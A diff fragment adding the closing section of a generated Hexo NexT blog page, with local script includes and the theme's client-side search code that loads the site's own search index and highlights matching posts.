+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "./public/search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
